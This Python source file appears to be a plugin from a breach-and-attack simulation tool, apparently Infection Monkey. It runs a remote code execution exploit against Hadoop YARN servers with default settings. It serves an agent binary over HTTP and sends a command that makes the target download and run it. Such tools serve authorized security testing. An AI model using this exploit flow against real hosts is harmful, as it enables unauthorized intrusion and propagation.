"""
    Remote code execution on HADOOP server with YARN and default settings
    Implementation is based on code from
    https://github.com/vulhub/vulhub/tree/master/hadoop/unauthorized-yarn
"""

import logging
from typing import Any, Dict, Sequence
from uuid import UUID

# common imports
from common.event_queue import IAgentEventPublisher
from common.types import Event
from common.utils.code_utils import del_key

# dependencies to get rid of or internalize
from infection_monkey.exploit import IAgentBinaryRepository
from infection_monkey.exploit.tools import HTTPBytesServer
from infection_monkey.exploit.tools.http_agent_binary_server import start_agent_binary_server
from infection_monkey.exploit.tools.web_tools import build_urls
from infection_monkey.i_puppet import ExploiterResultData
from infection_monkey.model import TargetHost
from infection_monkey.network import TCPPortSelector

from .hadoop_command_builder import build_hadoop_command
from .hadoop_exploit_client import HadoopExploitClient
from .hadoop_options import HadoopOptions

logger = logging.getLogger(__name__)


class Plugin:
    def __init__(
        self,
        *,
        plugin_name: str,
        agent_id: UUID,
        agent_event_publisher: IAgentEventPublisher,
        agent_binary_repository: IAgentBinaryRepository,
        tcp_port_selector: TCPPortSelector,
        **kwargs,
    ):
        self._agent_id = agent_id
        self._agent_event_publisher = agent_event_publisher
        self._agent_binary_repository = agent_binary_repository
        self._tcp_port_selector = tcp_port_selector

    def run(
        self,
        *,
        host: TargetHost,
        servers: Sequence[str],
        current_depth: int,
        options: Dict[str, Any],
        interrupt: Event,
        **kwargs,
    ) -> ExploiterResultData:
        # HTTP ports options are hack because they are needed in fingerprinters
        del_key(options, "http_ports")
        try:
            hadoop_options = HadoopOptions(**options)
        except Exception as err:
            msg = f"Failed to parse Hadoop options: {err}"
            logger.exception(msg)
            return ExploiterResultData(error_message=msg)

        # Try to get potential urls
        potential_urls = _build_potential_urls(host, hadoop_options)
        if not potential_urls:
            msg = f"No potential URLs found for host: {host.ip}"
            logger.debug(msg)
            return ExploiterResultData(error_message=msg)

        try:
            agent_binary_http_server = start_agent_binary_server(
                host, self._agent_binary_repository, self._tcp_port_selector
            )
        except Exception as err:
            msg = (
                "An unexpected exception occurred while attempting to start the agent binary HTTP "
                f"server: {err}"
            )
            logger.exception(msg)
            return ExploiterResultData(error_message=msg)

        command = build_hadoop_command(
            host, servers, current_depth, agent_binary_http_server.download_url
        )

        try:
            hadoop_exploit_client = HadoopExploitClient(
                host,
                hadoop_options,
                interrupt,
                self._agent_id,
                self._agent_event_publisher,
            )
            return hadoop_exploit_client.exploit_urls(potential_urls, command)
        except Exception as err:
            msg = (
                "An unexpected exception occurred while attempting to exploit the host "
                f'"{host.ip}" with the Hadoop exploiter: {err}'
            )
            logger.exception(msg)
            return ExploiterResultData(error_message=msg)
        finally:
            _stop_agent_binary_http_server(
                agent_binary_http_server, hadoop_options.agent_binary_download_timeout
            )


def _build_potential_urls(host: TargetHost, hadoop_options: HadoopOptions) -> Sequence[str]:
    return build_urls(str(host.ip), [(str(p), False) for p in hadoop_options.target_ports])


def _stop_agent_binary_http_server(
    agent_binary_http_server: HTTPBytesServer, agent_binary_download_timeout: float
):
    try:
        agent_binary_http_server.stop(agent_binary_download_timeout)
    except Exception:
        logger.exception("An unexpected error occurred while stopping the HTTP server")
